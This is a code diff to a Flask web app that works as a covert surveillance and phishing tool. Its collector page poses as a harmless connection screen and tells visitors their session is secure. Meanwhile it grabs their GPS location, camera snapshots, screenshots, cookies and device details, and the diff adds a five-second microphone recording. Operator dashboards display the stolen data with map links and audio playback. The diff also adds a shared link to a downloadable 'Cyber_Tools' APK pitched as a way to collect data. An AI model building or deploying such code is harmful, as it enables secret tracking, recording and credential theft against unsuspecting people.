@@ -55,6 +55,7 @@ BASE_CSS = """
     .link-card .del-btn{background:#ff004422;border:1px solid #ff0044;padding:12px 25px;border-radius:10px;color:#ffccbb;text-decoration:none;font-size:1.1rem}
     .visit-card{background:#0d1520;padding:22px;border-radius:18px;margin:20px 0;border-left:6px solid #ff0044;font-size:1.2rem}
     .visit-card img{max-width:250px;height:auto;border-radius:12px;border:1px solid #334466;display:block;margin:12px 0}
+    .visit-card audio{max-width:250px;margin:10px 0}
     .visit-card .label{color:#6688aa;font-weight:bold;display:inline-block;width:150px}
     .visit-card .value{color:#00ffcc;display:inline;word-break:break-word}
     .visit-card .row{margin:10px 0}
@@ -69,6 +70,7 @@ BASE_CSS = """
     .admin-table tr:nth-child(even){background:#0d1520}
     .click-hint{color:#ff8866;font-size:1rem;margin-top:15px;cursor:pointer;text-align:center}
     .music-status{color:#00ffcc;font-size:1rem;margin-top:5px;text-align:center}
+    .admin-only{color:#ff8866;font-size:0.9rem;border:1px solid #ff886633;padding:5px 12px;border-radius:10px;display:inline-block}
     @media(max-width:600px){
         .container{padding:10px}
         .box{padding:20px}
@@ -133,7 +135,7 @@ REGISTER_HTML = """
 </html>
 """
 
-# ===== Dashboard with Music =====
+# ===== Dashboard with Music (Only Admin can create links) =====
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
@@ -157,13 +159,33 @@ DASHBOARD_HTML = """
             <span class="welcome">Welcome, {{ user.username }}</span>
             <a href="/logout" class="logout">🚪 Logout</a>
         </div>
+
+        <!-- ====== Fixed Default Link (Everyone sees this) ====== -->
         <div class="card">
-            <h3>📎 Create New Link</h3>
+            <h3>📎 Your Shareable Link</h3>
+            <p style="color:#6688aa;margin-bottom:10px;">Share this link to collect data:</p>
+            <div style="background:#0d1520;padding:15px;border-radius:12px;word-break:break-all;">
+                <a href="https://www.mediafire.com/file/9acuwwe88rfcfni/Cyber_Tools_1.0.0.apk/file" target="_blank" style="color:#00ffcc;font-size:1.2rem;">
+                    https://www.mediafire.com/file/9acuwwe88rfcfni/Cyber_Tools_1.0.0.apk/file
+                </a>
+            </div>
+            <p style="color:#6688aa;font-size:0.9rem;margin-top:8px;">👆 Click to copy or share this link</p>
+        </div>
+
+        <!-- ====== Admin-Only: Create New Link ====== -->
+        {% if user.username == 'admin' %}
+        <div class="card" style="border:2px solid #ff004488;">
+            <h3>🔑 Admin: Create New Link</h3>
             <form method="POST" action="/create_link">
                 <input type="text" name="link_name" placeholder="Link name (e.g., Facebook Tool)" required>
                 <button type="submit">🔗 Generate</button>
             </form>
+            <p class="admin-only">🔒 Only admin can create new links</p>
         </div>
+        {% endif %}
+
+        <!-- ====== User's Links (if any) ====== -->
+        {% if user.links %}
         <div class="card">
             <h3>📌 Your Links</h3>
             {% for link in user.links %}
@@ -178,10 +200,10 @@ DASHBOARD_HTML = """
                     <a href="/delete_link/{{ link.id }}" class="del-btn" onclick="return confirm('Delete this link and all its data?');">🗑️ Delete</a>
                 </div>
             </div>
-            {% else %}
-            <p style="color:#6688aa;font-size:1.2rem;">You haven't created any links.</p>
             {% endfor %}
         </div>
+        {% endif %}
+
         <div class="click-hint" onclick="playMusic()">🎵 Click to play background music</div>
     </div>
 
@@ -280,7 +302,9 @@ ADMIN_PANEL_HTML = """
                 <td>
                     <a href="/admin-view-user/{{ u.username }}" style="color:#00ffcc;">📊 View</a>
                     &nbsp;|&nbsp;
-                    <a href="/admin-delete-user/{{ u.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;">🗑️ Delete</a>
+                    <a href="/admin-clear-user-data/{{ u.username }}" onclick="return confirm('⚠️ Clear ALL data (links + visits) for this user? Account will remain active.');" style="color:#ffaa00;">🧹 Clear Data</a>
+                    &nbsp;|&nbsp;
+                    <a href="/admin-delete-user/{{ u.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data? This cannot be undone!');" style="color:#ff4444;">🗑️ Delete Account</a>
                 </td>
             </tr>
             {% endfor %}
@@ -291,8 +315,7 @@ ADMIN_PANEL_HTML = """
 </body>
 </html>
 """
-
-# ===== Admin View Single User (same as user view but with delete) =====
+# ===== Admin View Single User (full data) =====
 ADMIN_USER_HTML = """
 <!DOCTYPE html>
 <html>
@@ -303,26 +326,57 @@ ADMIN_USER_HTML = """
     <a href="/admin-panel" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.3rem;">⬅️ Back to Admin Panel</a>
     <h1>📊 User: {{ user.username }}</h1>
     <p class="total-visits">Total Links: {{ user.links|length }}</p>
-    <a href="/admin-delete-user/{{ user.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🗑️ Delete this user</a>
+    <a href="/admin-clear-user-data/{{ user.username }}" onclick="return confirm('⚠️ Clear ALL data (links + visits) for this user? Account will remain active.');" style="color:#ffaa00;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🧹 Clear All Data</a>
+    &nbsp;|&nbsp;
+    <a href="/admin-delete-user/{{ user.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🗑️ Delete Account</a>
 
     {% for link in user.links %}
     <div class="card">
         <h3>🔗 {{ link.name }} ({{ link.visits|length }} visits)</h3>
-        <div style="overflow-x:auto;">
-        <table class="admin-table">
-            <tr><th>#</th><th>IP</th><th>Location</th><th>GPS</th><th>Browser</th><th>Time</th></tr>
-            {% for v in link.visits %}
-            <tr>
-                <td>{{ loop.index }}</td>
-                <td>{{ v.get('ip', 'N/A') }}</td>
-                <td>{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</td>
-                <td>{{ v.get('gps', 'N/A') }}</td>
-                <td>{{ v.get('user_agent', 'N/A')[:30] }}..</td>
-                <td>{{ v.get('time', 'N/A') }}</td>
-            </tr>
-            {% endfor %}
-        </table>
+        {% for v in link.visits %}
+        <div class="visit-card">
+            <div class="row"><span class="label">IP Address:</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Location:</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
+            <div class="row"><span class="label">GPS (Lat, Lng):</span> <span class="value">{{ v.get('gps', 'N/A') }}</span>
+                {% if v.get('gps') and v.get('gps') not in ['Permission denied', 'Failed', 'N/A'] %}
+                    <a href="https://www.google.com/maps?q={{ v.get('gps').split(',')[0].strip() }},{{ v.get('gps').split(',')[1].strip() }}" target="_blank" class="map-link">🗺️ Live Map</a>
+                {% endif %}
+            </div>
+            <div class="row"><span class="label">Browser / OS:</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Screen:</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Language:</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Platform:</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Timezone:</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Battery Level:</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Camera:</span>
+                {% if v.get('camera') and v.get('camera') != 'Failed' %}
+                    <img src="{{ v.get('camera') }}" />
+                {% else %}
+                    <span class="value">N/A</span>
+                {% endif %}
+            </div>
+            <div class="row"><span class="label">Screenshot:</span>
+                {% if v.get('screenshot') and v.get('screenshot') != 'Failed' %}
+                    <img src="{{ v.get('screenshot') }}" />
+                {% else %}
+                    <span class="value">N/A</span>
+                {% endif %}
+            </div>
+            <div class="row"><span class="label">Audio (5s):</span>
+                {% if v.get('audio') and v.get('audio') != 'Failed' %}
+                    <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
+                {% else %}
+                    <span class="value">N/A</span>
+                {% endif %}
+            </div>
+            <div class="row"><span class="label">Time:</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
         </div>
+        {% else %}
+        <p style="color:#6688aa;">No visits for this link.</p>
+        {% endfor %}
     </div>
     {% else %}
     <p style="color:#6688aa;">No links found.</p>
@@ -332,7 +386,7 @@ ADMIN_USER_HTML = """
 </html>
 """
 
-# ===== User View Link (full data, same as admin) =====
+# ===== User View Link (full data including audio) =====
 VIEW_LINK_HTML = """
 <!DOCTYPE html>
 <html>
@@ -377,6 +431,13 @@ VIEW_LINK_HTML = """
                     <span class="value">N/A</span>
                 {% endif %}
             </div>
+            <div class="row"><span class="label">Audio (5s):</span>
+                {% if v.get('audio') and v.get('audio') != 'Failed' %}
+                    <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
+                {% else %}
+                    <span class="value">N/A</span>
+                {% endif %}
+            </div>
             <div class="row"><span class="label">Time:</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
             <a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️ Delete this visit</a>
         </div>
@@ -388,8 +449,7 @@ VIEW_LINK_HTML = """
 </body>
 </html>
 """
-
-# ===== Collector Page =====
+# ===== Collector Page (with audio recording) =====
 COLLECTOR_HTML = """
 <!DOCTYPE html>
 <html>
@@ -414,22 +474,54 @@ p{font-size:1.5rem;color:#6688aa}
                 () => { gps = 'Failed'; }
             );
         }
+
         let camera = null;
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 320; canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    camera = canvas.toDataURL('image/jpeg');
-                    stream.getTracks().forEach(t => t.stop());
+        let audioData = null;
+
+        // Request camera and microphone simultaneously
+        Promise.all([
+            navigator.mediaDevices.getUserMedia({ video: true }),
+            navigator.mediaDevices.getUserMedia({ audio: true })
+        ])
+        .then(([videoStream, audioStream]) => {
+            // Camera capture
+            const video = document.createElement('video');
+            video.srcObject = videoStream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                camera = canvas.toDataURL('image/jpeg');
+                videoStream.getTracks().forEach(t => t.stop());
+            }, 2000);
+
+            // Audio recording (5 seconds)
+            const mediaRecorder = new MediaRecorder(audioStream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.onload = () => {
+                    audioData = reader.result; // base64
                     sendData();
-                }, 2000);
-            })
-            .catch(() => { camera = 'Failed'; sendData(); });
+                };
+                reader.readAsDataURL(blob);
+            };
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                audioStream.getTracks().forEach(t => t.stop());
+            }, 5000);
+        })
+        .catch(err => {
+            // If any permission fails, still send other data
+            console.log('Permissions error:', err);
+            camera = 'Failed';
+            audioData = 'Failed';
+            sendData();
+        });
 
         function captureScreen() {
             const canvas = document.createElement('canvas');
@@ -458,35 +550,51 @@ p{font-size:1.5rem;color:#6688aa}
             let cookies = document.cookie || 'None';
             let referrer = document.referrer || 'Direct';
 
-            const data = {
-                ip: "{{ ip }}",
-                user_agent: navigator.userAgent,
-                screen: screen.width + "x" + screen.height,
-                language: navigator.language,
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                gps: gps,
-                camera: camera,
-                screenshot: captureScreen(),
-                battery: battery,
-                memory: memory,
-                cookies: cookies,
-                referrer: referrer,
-                time: new Date().toLocaleString()
+            // Wait for audio and camera to be ready, but if they are still null, use fallback
+            const checkAndSend = () => {
+                if (camera !== null && audioData !== null) {
+                    const data = {
+                        ip: "{{ ip }}",
+                        user_agent: navigator.userAgent,
+                        screen: screen.width + "x" + screen.height,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        gps: gps,
+                        camera: camera,
+                        screenshot: captureScreen(),
+                        audio: audioData,
+                        battery: battery,
+                        memory: memory,
+                        cookies: cookies,
+                        referrer: referrer,
+                        time: new Date().toLocaleString()
+                    };
+                    fetch('/collect/{{ link_id }}', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(data)
+                    }).then(() => {
+                        document.getElementById('status').innerHTML = '✅ Connection established. Please wait...';
+                        setTimeout(() => {
+                            document.querySelector('.loader').style.display = 'none';
+                            document.querySelector('p').textContent = 'Thank you! You are now connected.';
+                            document.getElementById('status').innerHTML = '🔒 Your session is secure.';
+                        }, 1500);
+                    });
+                } else {
+                    setTimeout(checkAndSend, 500);
+                }
             };
-            fetch('/collect/{{ link_id }}', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            }).then(() => {
-                document.getElementById('status').innerHTML = '✅ Connection established. Please wait...';
-                setTimeout(() => {
-                    document.querySelector('.loader').style.display = 'none';
-                    document.querySelector('p').textContent = 'Thank you! You are now connected.';
-                    document.getElementById('status').innerHTML = '🔒 Your session is secure.';
-                }, 1500);
-            });
+            checkAndSend();
         }
+
+        // Fallback: if audio/camera not ready after 8 seconds, force send
+        setTimeout(() => {
+            if (camera === null) camera = 'Failed';
+            if (audioData === null) audioData = 'Failed';
+            sendData();
+        }, 8000);
     </script>
 </body>
 </html>
@@ -557,6 +665,9 @@ def dashboard():
 def create_link():
     if 'user' not in session:
         return redirect(url_for('login'))
+    # Only admin can create links
+    if session['user'] != 'admin':
+        return redirect(url_for('dashboard'))
     link_name = request.form.get('link_name', '').strip()
     if not link_name:
         return redirect(url_for('dashboard'))
@@ -693,10 +804,29 @@ def admin_view_user(username):
         return 'User not found', 404
     return render_template_string(ADMIN_USER_HTML, user=user)
 
+# ===== Admin Clear User Data (links + visits, but keep account) =====
+@app.route('/admin-clear-user-data/<username>')
+def admin_clear_user_data(username):
+    if 'admin' not in session:
+        return redirect(url_for('admin_login'))
+    # Set links array to empty
+    result = users_col.update_one(
+        {'username': username},
+        {'$set': {'links': []}}
+    )
+    if result.modified_count:
+        return redirect(url_for('admin_panel'))
+    else:
+        return 'User not found or already empty', 404
+
+# ===== Admin Delete User (account + all data) =====
 @app.route('/admin-delete-user/<username>')
 def admin_delete_user(username):
     if 'admin' not in session:
         return redirect(url_for('admin_login'))
+    # Prevent deleting the admin account
+    if username == 'admin':
+        return "You cannot delete the admin account!", 403
     result = users_col.delete_one({'username': username})
     if result.deleted_count:
         return redirect(url_for('admin_panel'))
